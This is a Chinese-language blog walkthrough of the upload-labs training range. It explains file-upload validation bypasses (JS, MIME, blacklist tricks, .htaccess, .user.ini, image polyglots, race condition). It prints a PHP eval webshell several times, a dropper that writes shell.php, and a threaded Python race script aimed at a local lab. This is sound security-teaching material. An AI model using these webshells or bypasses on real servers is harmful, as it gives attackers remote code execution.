+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="2-0-upload-labs实战"><a href="#2-0-upload-labs实战" class="headerlink" title="2.0 upload-labs实战"></a>2.0 upload-labs实战</h2><h3 id="2-1-前端JS校验绕过-Pass-01"><a href="#2-1-前端JS校验绕过-Pass-01" class="headerlink" title="2.1 前端JS校验绕过(Pass-01)"></a>2.1 前端JS校验绕过(Pass-01)</h3><h4 id="01-原理"><a href="#01-原理" class="headerlink" title="01 原理"></a>01 原理</h4><ul>
+<li>服务端未做任何校验, 仅通过前端JavaScript的 <code>onsubmit</code>事件检查文件后缀. 由于JS运行在客户端, 攻击者可完全控制.</li>
+</ul>
+<h4 id="02-绕过方式"><a href="#02-绕过方式" class="headerlink" title="02 绕过方式"></a>02 绕过方式</h4><table>
+<thead>
+<tr>
+<th>方法</th>
+<th>操作</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>方法1</td>
+<td>浏览器设置中禁用 JavaScript</td>
+</tr>
+<tr>
+<td>方法2</td>
+<td>先上传合法图片，Burp 抓包改后缀为 <code>.php</code></td>
+</tr>
+</tbody></table>
+<p><img data-src="/2026/07/31/web-security/upload-file/2026-07-31-upload-file/2.png"></p>
+<blockquote>
+<p>上图展示关闭浏览器JS校验</p>
+</blockquote>
+<p><img data-src="/2026/07/31/web-security/upload-file/2026-07-31-upload-file/3.png"></p>
+<blockquote>
+<p>如上图, BurpSuite抓包后修改文件后缀为.php即可</p>
+</blockquote>
+<h4 id="03-获取shell-示例工具为蚁剑"><a href="#03-获取shell-示例工具为蚁剑" class="headerlink" title="03 获取shell(示例工具为蚁剑)"></a>03 获取shell(示例工具为蚁剑)</h4><p><img data-src="/2026/07/31/web-security/upload-file/2026-07-31-upload-file/4.png"></p>
+<blockquote>
+<p>如图, 已成功获取webshell !</p>
+</blockquote>
+<hr>
+<h3 id="2-2-MIME类型校验绕过-Pass-02"><a href="#2-2-MIME类型校验绕过-Pass-02" class="headerlink" title="2.2 MIME类型校验绕过(Pass-02)"></a>2.2 MIME类型校验绕过(Pass-02)</h3><h4 id="01-原理-1"><a href="#01-原理-1" class="headerlink" title="01 原理"></a>01 原理</h4><ul>
+<li><p>服务端检查 HTTP 请求中的 <code>Content-Type</code> 字段, 判断文件是否为图片类型. 该字段由客户端控制, 可任意伪造. </p>
+</li>
+<li><p>常见 MIME 类型:</p>
+<table>
+<thead>
+<tr>
+<th>后缀</th>
+<th>Content-Type</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>.jpg</td>
+<td>image&#x2F;jpeg</td>
+</tr>
+<tr>
+<td>.png</td>
+<td>image&#x2F;png</td>
+</tr>
+<tr>
+<td>.gif</td>
+<td>image&#x2F;gif</td>
+</tr>
+<tr>
+<td>.php</td>
+<td>application&#x2F;x-php</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+<h4 id="02-绕过方式-1"><a href="#02-绕过方式-1" class="headerlink" title="02 绕过方式"></a>02 绕过方式</h4><p>Burp 抓包 → 将 <code>Content-Type: application/x-php</code> 改为 <code>image/png</code></p>
+<p><img data-src="/2026/07/31/web-security/upload-file/2026-07-31-upload-file/5.png"></p>
+<blockquote>
+<p>如上图, 修改抓包数据, 即可实现上传绕过</p>
+<p>结论: MIME 类型由客户端声明, 不可作为安全校验依据</p>
+</blockquote>
+<hr>
+<h3 id="2-3-1-黑名单绕过-非常规后缀-等价扩展名-Pass-03"><a href="#2-3-1-黑名单绕过-非常规后缀-等价扩展名-Pass-03" class="headerlink" title="2.3.1 黑名单绕过 - 非常规后缀(等价扩展名)(Pass-03)"></a>2.3.1 黑名单绕过 - 非常规后缀(等价扩展名)(Pass-03)</h3><h4 id="01-原理-2"><a href="#01-原理-2" class="headerlink" title="01 原理:"></a>01 原理:</h4><ul>
+<li>服务端维护一个”禁止上传的后缀列表”(黑名单)<br>如果文件后缀不在列表中则允许上传<br>绕过思路: <strong>找到一个不在黑名单中, 但服务器仍会解析为 PHP 的后缀或变形</strong></li>
+</ul>
+<p><strong>黑名单缺陷:</strong> </p>
+<ul>
+<li>黑名单永远无法穷举所有危险后缀, 只要遗漏一个，就可能被绕过</li>
+</ul>
+<h4 id="02-绕过方式-2"><a href="#02-绕过方式-2" class="headerlink" title="02 绕过方式"></a>02 绕过方式</h4><p><strong>注意:</strong> 需要将Apache配置文件<code>httpd.conf</code> 修改以下参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .php3</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>修改后重启Apache服务</p>
+</blockquote>
+<p><img data-src="/2026/07/31/web-security/upload-file/2026-07-31-upload-file/6.png"></p>
+<blockquote>
+<p>如上图, 修改后缀为.php3 Forward后, 用蚁剑测试图片链接</p>
+</blockquote>
+<h3 id="2-3-2-黑名单绕过-大小写绕过-Pass-06"><a href="#2-3-2-黑名单绕过-大小写绕过-Pass-06" class="headerlink" title="2.3.2 黑名单绕过 - 大小写绕过(Pass-06)"></a>2.3.2 黑名单绕过 - 大小写绕过(Pass-06)</h3><h4 id="01-原理-3"><a href="#01-原理-3" class="headerlink" title="01 原理"></a>01 原理</h4><ul>
+<li>黑名单中只写了小写 <code>.php</code>, 但 Windows 文件系统不区分大小写</li>
+<li>Windows系统中, 对文件名后缀大小写不敏感, 例: <code>.php = .PhP</code></li>
+<li>Linux系统中, 对文件名后缀大小写敏感, <code>.php ≠ .PhP</code>通常被认定为两个文件</li>
+</ul>
+<h4 id="02-绕过方式-3"><a href="#02-绕过方式-3" class="headerlink" title="02 绕过方式"></a>02 绕过方式</h4><p>BurpSuite 抓包, 将对应字段的.php修改为带大写字母即可</p>
+<p><img data-src="/2026/07/31/web-security/upload-file/2026-07-31-upload-file/7.png"></p>
+<blockquote>
+<p>如上图, 修改后缀为.Php Forward后, 用蚁剑测试图片链接</p>
+</blockquote>
+<h3 id="2-3-3-黑名单绕过-后缀空格绕过-Pass-07"><a href="#2-3-3-黑名单绕过-后缀空格绕过-Pass-07" class="headerlink" title="2.3.3 黑名单绕过 - 后缀空格绕过(Pass-07)"></a>2.3.3 黑名单绕过 - 后缀空格绕过(Pass-07)</h3><h4 id="01-原理-4"><a href="#01-原理-4" class="headerlink" title="01 原理"></a>01 原理</h4><ul>
+<li>黑名单检查时未对后缀做 <code>trim()</code> 处理, 但 Windows 文件系统会自动去除文件名末尾的空格</li>
+</ul>
+<h4 id="02-绕过方式-4"><a href="#02-绕过方式-4" class="headerlink" title="02 绕过方式"></a>02 绕过方式</h4><p> BurpSuite 抓包, 将文件名改为 <code>demo.php </code>(此处实际存在空格)</p>
+<p><img data-src="/2026/07/31/web-security/upload-file/2026-07-31-upload-file/8.png"></p>
+<blockquote>
+<p>如上图, 修改后缀为.php[空格]  Forward后, 用蚁剑测试图片链接</p>
+</blockquote>
+<h3 id="2-3-4-黑名单绕过-后缀点绕过-Pass-08"><a href="#2-3-4-黑名单绕过-后缀点绕过-Pass-08" class="headerlink" title="2.3.4 黑名单绕过 - 后缀点绕过(Pass-08)"></a>2.3.4 黑名单绕过 - 后缀点绕过(Pass-08)</h3><h4 id="01-原理-5"><a href="#01-原理-5" class="headerlink" title="01 原理"></a>01 原理</h4><ul>
+<li>与空格类似, Windows 文件系统会自动去除文件名末尾的点号</li>
+</ul>
+<h4 id="02-绕过方式-5"><a href="#02-绕过方式-5" class="headerlink" title="02 绕过方式"></a>02 绕过方式</h4><p>文件名改为 <code>demo.php.</code></p>
+<p><img data-src="/2026/07/31/web-security/upload-file/2026-07-31-upload-file/9.png"></p>
+<blockquote>
+<p>修改后缀为.php.  Forward后, 用蚁剑测试图片链接</p>
+</blockquote>
+<h3 id="2-3-5-黑名单绕过-DATA绕过-Pass-09"><a href="#2-3-5-黑名单绕过-DATA绕过-Pass-09" class="headerlink" title="2.3.5 黑名单绕过 - ::$DATA绕过(Pass-09)"></a>2.3.5 黑名单绕过 - ::$DATA绕过(Pass-09)</h3><h4 id="01-原理-6"><a href="#01-原理-6" class="headerlink" title="01 原理"></a>01 原理</h4><ul>
+<li>Windows NTFS 文件系统的<strong>数据流特性</strong>, 在文件名后附加 <code>::$DATA</code>, Windows 会将其视为默认数据流, 实际创建的文件名不包含 <code>::$DATA</code> 部分</li>
+</ul>
+<h4 id="02-绕过方式-6"><a href="#02-绕过方式-6" class="headerlink" title="02 绕过方式"></a>02 绕过方式</h4><p>文件名改为<code>demo.php::$DATA</code></p>
+<blockquote>
+<p>仅限Windows+NTFS文件系统</p>
+</blockquote>
+<p><img data-src="/2026/07/31/web-security/upload-file/2026-07-31-upload-file/10.png"></p>
+<blockquote>
+<p>修改后缀为.php::$DATA  Forward后, 用蚁剑测试图片链接(URL需去掉::$DATA)</p>
+</blockquote>
+<h3 id="2-3-6-黑名单绕过-点空格点绕过-Pass-10"><a href="#2-3-6-黑名单绕过-点空格点绕过-Pass-10" class="headerlink" title="2.3.6 黑名单绕过 - 点空格点绕过(Pass-10)"></a>2.3.6 黑名单绕过 - 点空格点绕过(Pass-10)</h3><h4 id="01-原理-7"><a href="#01-原理-7" class="headerlink" title="01 原理"></a>01 原理</h4><ul>
+<li>黑名单检查后缀时, 取最后一个 <code>.</code> 后的内容, 构造 <code>demo.php. .</code>(点+空格+点), 经过 <code>trim()</code> 和 <code>deldot()</code> 处理后, 最终后缀变为 <code>.php.</code>, 但黑名单检查时可能已经通过</li>
+</ul>
+<h4 id="02-绕过方式-7"><a href="#02-绕过方式-7" class="headerlink" title="02 绕过方式"></a>02 绕过方式</h4><p>文件名改为<code>demo.php. .</code></p>
+<p><img data-src="/2026/07/31/web-security/upload-file/2026-07-31-upload-file/11.png"></p>
+<blockquote>
+<p>后缀变化 .php. . →.php.</p>
+</blockquote>
+<h3 id="2-3-7-黑名单绕过-双写绕过-Pass-11"><a href="#2-3-7-黑名单绕过-双写绕过-Pass-11" class="headerlink" title="2.3.7 黑名单绕过 - 双写绕过(Pass-11)"></a>2.3.7 黑名单绕过 - 双写绕过(Pass-11)</h3><h4 id="01-原理-8"><a href="#01-原理-8" class="headerlink" title="01 原理"></a>01 原理</h4><ul>
+<li>服务端使用 <code>str_ireplace()</code> 将黑名单后缀替换为空字符串, 但只替换一次, 不做递归</li>
+</ul>
+<h4 id="02-绕过方式-8"><a href="#02-绕过方式-8" class="headerlink" title="02 绕过方式"></a>02 绕过方式</h4><p>文件名改为<code>demo.pphphp</code></p>
+<p><img data-src="/2026/07/31/web-security/upload-file/2026-07-31-upload-file/12.png"></p>
+<hr>
+<h3 id="2-4-htaccess文件绕过-Pass-04"><a href="#2-4-htaccess文件绕过-Pass-04" class="headerlink" title="2.4 .htaccess文件绕过(Pass-04)"></a>2.4 .htaccess文件绕过(Pass-04)</h3><h4 id="01-原理-9"><a href="#01-原理-9" class="headerlink" title="01 原理"></a>01 原理</h4><ul>
+<li>Apache 支持目录级配置文件 <code>.htaccess</code>如果能上传一个 <code>.htaccess</code> 文件到上传目录, 就可以让该目录下的所有文件都被 PHP 引擎解析</li>
+</ul>
+<p><strong>前提条件</strong></p>
+<ul>
+<li><p>Apache服务器</p>
+</li>
+<li><p><code>httpd.conf</code>文件中 AllowOverride All</p>
+</li>
+<li><p>上传目录可写</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>httpd-conf</th>
+<th>.htaccess</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>作用范围</td>
+<td>整个服务器</td>
+<td>当前目录</td>
+</tr>
+<tr>
+<td>优先级</td>
+<td>较低</td>
+<td>较高</td>
+</tr>
+<tr>
+<td>生效方式</td>
+<td>重启服务器</td>
+<td>修改即生效</td>
+</tr>
+</tbody></table>
+<ul>
+<li><strong>.htaccess</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .txt .jpg</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="02-绕过方式-9"><a href="#02-绕过方式-9" class="headerlink" title="02 绕过方式"></a>02 绕过方式</h4><ul>
+<li><p>上传 <code>.htaccess</code>文件</p>
+</li>
+<li><p>上传Script文件 <code>.jpg</code>或<code>.txt</code>(与.htaccess对应)</p>
+</li>
+</ul>
+<p><img data-src="/2026/07/31/web-security/upload-file/2026-07-31-upload-file/13.png"></p>
+<blockquote>
+<p>依次上传.htaccess → demo.jpg(包含php代码)</p>
+</blockquote>
+<hr>
+<h3 id="2-5-user-ini文件绕过-Pass-05"><a href="#2-5-user-ini文件绕过-Pass-05" class="headerlink" title="2.5 .user.ini文件绕过(Pass-05)"></a>2.5 .user.ini文件绕过(Pass-05)</h3><h4 id="01-原理-10"><a href="#01-原理-10" class="headerlink" title="01 原理"></a>01 原理</h4><ul>
+<li>PHP 支持目录级配置文件 <code>.user.ini</code>, 其中 <code>auto_prepend_file</code> 指令可以让每个 PHP 文件执行前<br>自动包含指定文件</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>php.ini</th>
+<th>.user.ini</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>描述</td>
+<td>存储整个php环境生效配置</td>
+<td>特定用户或目录的配置文件</td>
+</tr>
+<tr>
+<td>位置</td>
+<td>php安装目录</td>
+<td>Web应用程序根目录</td>
+</tr>
+<tr>
+<td>作用</td>
+<td>php环境配置</td>
+<td>覆盖或追加全局配置文件</td>
+</tr>
+</tbody></table>
+<h4 id="02-绕过方式-10"><a href="#02-绕过方式-10" class="headerlink" title="02 绕过方式"></a>02 绕过方式</h4><ul>
+<li><p>编写<code>.user.ini</code>文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=test.txt</span><br><span class="line"><span class="comment"># 在所有文件中都包含test.txt中文件内容</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>编写<code>test.txt</code>文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>依次上传<code>.user.ini</code> <code>test.txt</code></p>
+</li>
+<li><p>访问&#x2F;upload-labs&#x2F;readme.php</p>
+</li>
+</ul>
+<p><img data-src="/2026/07/31/web-security/upload-file/2026-07-31-upload-file/14.png"></p>
+<blockquote>
+<p>文件被成功包含, 且蚁剑可连接</p>
+</blockquote>
+<hr>
+<h3 id="2-6-1-图片马绕过-文件头绕过-Pass-14"><a href="#2-6-1-图片马绕过-文件头绕过-Pass-14" class="headerlink" title="2.6.1 图片马绕过-文件头绕过(Pass-14)"></a>2.6.1 图片马绕过-文件头绕过(Pass-14)</h3><h4 id="01-原理-11"><a href="#01-原理-11" class="headerlink" title="01 原理"></a>01 原理</h4><ul>
+<li><p>服务端只检查文件头的几个字节, 不检查文件完整内容</p>
+</li>
+<li><p>常见文件头:</p>
+<table>
+<thead>
+<tr>
+<th>格式</th>
+<th>文件头(Hex)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>JPEG</td>
+<td>FF D8 FF E0</td>
+</tr>
+<tr>
+<td>PNG</td>
+<td>89 50 4E 47</td>
+</tr>
+<tr>
+<td>GIF</td>
+<td>47 49 46 38</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+<h4 id="02-绕过方式-11"><a href="#02-绕过方式-11" class="headerlink" title="02 绕过方式"></a>02 绕过方式</h4><ul>
+<li><p>将<code>demo.php</code>十六进制编码前两位改为PNG格式<code>89 50</code></p>
+</li>
+<li><p>上传文件绕过验证</p>
+</li>
+<li><p>通过文件包含方式访问</p>
+<p><code>demo.php</code>写入以下内容, 并通过<code>010Editor</code>(工具) 修改Hex</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// aa占位, 修改Hex参数预留</span></span><br><span class="line">aa</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/31/web-security/upload-file/2026-07-31-upload-file/15.png"></p>
+<p><img data-src="/2026/07/31/web-security/upload-file/2026-07-31-upload-file/16.png"></p>
+</li>
+</ul>
+<h3 id="2-6-2-图片马绕过-getimagesize-Pass-15"><a href="#2-6-2-图片马绕过-getimagesize-Pass-15" class="headerlink" title="2.6.2 图片马绕过-getimagesize()(Pass-15)"></a>2.6.2 图片马绕过-getimagesize()(Pass-15)</h3><h4 id="01-原理-12"><a href="#01-原理-12" class="headerlink" title="01 原理"></a>01 原理</h4><ul>
+<li><code>getimagesize()</code> 比简单的文件头检查更严格, 它会尝试解析图片的完整结构, 但对于 GIF 格式<br>只需在文件开头加上 <code>GIF89a</code> 即可骗过</li>
+</ul>
+<h4 id="02-1-绕过方式-1"><a href="#02-1-绕过方式-1" class="headerlink" title="02-1 绕过方式 1"></a>02-1 绕过方式 1</h4><ul>
+<li><p>修改文件头, 使用文件包含访问</p>
+<p><img data-src="/2026/07/31/web-security/upload-file/2026-07-31-upload-file/19.png"></p>
+<p><img data-src="/2026/07/31/web-security/upload-file/2026-07-31-upload-file/20.png"></p>
+</li>
+</ul>
+<h4 id="02-2-绕过方式-2"><a href="#02-2-绕过方式-2" class="headerlink" title="02-2 绕过方式 2"></a>02-2 绕过方式 2</h4><ul>
+<li><p>使用现有<code>.png</code>和<code>.php</code>结合生成新的<code>.png</code>文件, 通过文件包含方式访问</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> <span class="number">1</span>.png/b+demo.php shell.png</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/31/web-security/upload-file/2026-07-31-upload-file/17.png"></p>
+</li>
+</ul>
+<p><img data-src="/2026/07/31/web-security/upload-file/2026-07-31-upload-file/18.png"></p>
+<blockquote>
+<p>成功连接Shell</p>
+</blockquote>
+<h4 id="02-3-绕过方式-3"><a href="#02-3-绕过方式-3" class="headerlink" title="02-3 绕过方式 3"></a>02-3 绕过方式 3</h4><ul>
+<li><p>源<code>.png</code>图尾部直接添加一句话木马脚本</p>
+<p><img data-src="/2026/07/31/web-security/upload-file/2026-07-31-upload-file/21.png"></p>
+<p><img data-src="/2026/07/31/web-security/upload-file/2026-07-31-upload-file/22.png"></p>
+</li>
+</ul>
+<h3 id="2-6-3-图片马绕过-二次渲染-Pass-17"><a href="#2-6-3-图片马绕过-二次渲染-Pass-17" class="headerlink" title="2.6.3 图片马绕过-二次渲染(Pass-17)"></a>2.6.3 图片马绕过-二次渲染(Pass-17)</h3><h4 id="01-原理-13"><a href="#01-原理-13" class="headerlink" title="01 原理"></a>01 原理</h4><ul>
+<li>服务端使用 GD 库或 ImageMagick 对上传的图片进行<strong>重新渲染</strong>(如缩放, 裁剪), 渲染过程会破坏嵌入的 PHP 代码</li>
+</ul>
+<h4 id="02-绕过方式-12"><a href="#02-绕过方式-12" class="headerlink" title="02 绕过方式"></a>02 绕过方式</h4><p>思路:</p>
+<ul>
+<li><p>上传一张正常图片</p>
+</li>
+<li><p>下载服务端渲染后的图片</p>
+</li>
+<li><p>对比渲染前后的差异, 找到未被修改的字节区域</p>
+</li>
+<li><p>将 PHP 代码嵌入到这些”安全区域”中</p>
+</li>
+<li><p>重新上传</p>
+</li>
+<li><p>插件手工绕过使用<code>.gif</code>类型文件</p>
+<p><img data-src="/2026/07/31/web-security/upload-file/2026-07-31-upload-file/23.png"></p>
+<p><img data-src="/2026/07/31/web-security/upload-file/2026-07-31-upload-file/24.png"></p>
+</li>
+</ul>
+<hr>
+<h3 id="2-7-条件竞争-Pass-18"><a href="#2-7-条件竞争-Pass-18" class="headerlink" title="2.7 条件竞争(Pass-18)"></a>2.7 条件竞争(Pass-18)</h3><h4 id="01-原理-14"><a href="#01-原理-14" class="headerlink" title="01 原理"></a>01 原理</h4><p><img data-src="/2026/07/31/web-security/upload-file/2026-07-31-upload-file/25.png"></p>
+<ul>
+<li><p>在上传和删除之间存在极短的时间窗口, 若攻击者在这个时间差内访问到文件, 就能够执行恶意代码</p>
+</li>
+<li><p><strong>利用条件</strong>: 恶意文件被执行一次即可 (如写入1个WebShell)</p>
+</li>
+</ul>
+<h4 id="02-绕过方式-13"><a href="#02-绕过方式-13" class="headerlink" title="02 绕过方式"></a>02 绕过方式</h4><ul>
+<li><p><code>test.php</code>测试脚本写入以下内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/shell.php&#x27;</span>, <span class="variable">$shell</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Shell created&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>思路: 上传test.php文件, 文件被先保存后删除, 在这个’’时间窗口” 内写入新文件<code>shell.php</code></p>
+</blockquote>
+</li>
+<li><p>接收端Python脚本<code>access.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">BASE = <span class="string">&quot;http://127.0.0.1:81/upload-labs/upload&quot;</span></span><br><span class="line">found = <span class="literal">False</span> <span class="comment">#全局标志, 找到shell即停</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trigger</span>():</span><br><span class="line">    <span class="comment"># 不断访问 test.php 触发php执行</span></span><br><span class="line">    <span class="keyword">global</span> found</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> found:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.get(<span class="string">f&quot;<span class="subst">&#123;BASE&#125;</span>/test.php&quot;</span>, timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>():</span><br><span class="line">    <span class="comment"># 不断检测shell.php 是否存在</span></span><br><span class="line">    <span class="keyword">global</span> found</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> found:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(<span class="string">f&quot;<span class="subst">&#123;BASE&#125;</span>/shell.php&quot;</span>, timeout=<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">                found = <span class="literal">True</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n[+] shell OK!&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+]link:<span class="subst">&#123;BASE&#125;</span>/shell.php&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+]password: cmd&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 先启动BurpSuite-Intruder, 按回车开始..&quot;</span>)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>): <span class="comment"># 5个触发线程</span></span><br><span class="line">        threading.Thread(target=trigger, daemon=<span class="literal">True</span>).start()</span><br><span class="line">    check()            <span class="comment"># 主线程负责检测</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>绕过流程</p>
+<ul>
+<li>启动靶场</li>
+<li>选择<code>test.php</code></li>
+<li>BurpSuite抓包拦截</li>
+<li>拦截数据定向至Intruder<ul>
+<li>Payload type: <code>Null payloads</code></li>
+<li>Payload configuration: <code>Continue indefinitely</code></li>
+<li>Start attack</li>
+</ul>
+</li>
+<li>启动<code>access.py</code></li>
+</ul>
+<p><img data-src="/2026/07/31/web-security/upload-file/2026-07-31-upload-file/26.png"></p>
+<p><img data-src="/2026/07/31/web-security/upload-file/2026-07-31-upload-file/27.png"></p>
+<p><img data-src="/2026/07/31/web-security/upload-file/2026-07-31-upload-file/28.png"></p>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/upload-file/" rel="tag"># upload-file</a>
+              <a href="/tags/upload-labs/" rel="tag"># upload-labs</a>
+              <a href="/tags/JS%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87/" rel="tag"># JS校验绕过</a>
+              <a href="/tags/MIME%E7%B1%BB%E5%9E%8B%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87/" rel="tag"># MIME类型校验绕过</a>
+              <a href="/tags/%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/" rel="tag"># 黑名单绕过</a>
+              <a href="/tags/htaccess/" rel="tag"># .htaccess</a>
+              <a href="/tags/user-ini/" rel="tag"># .user.ini</a>
+              <a href="/tags/%E6%96%87%E4%BB%B6%E5%A4%B4%E4%BC%AA%E9%80%A0-%E5%9B%BE%E7%89%87%E9%A9%AC/" rel="tag"># 文件头伪造(图片马)</a>
+              <a href="/tags/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/" rel="tag"># 条件竞争</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/07/22/web-security/xss/2026-07-22-cookie-hijacking/" rel="prev" title="Cookie-Hijacking">
+                  <i class="fa fa-angle-left"></i> Cookie-Hijacking
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments utterances-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Byron</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
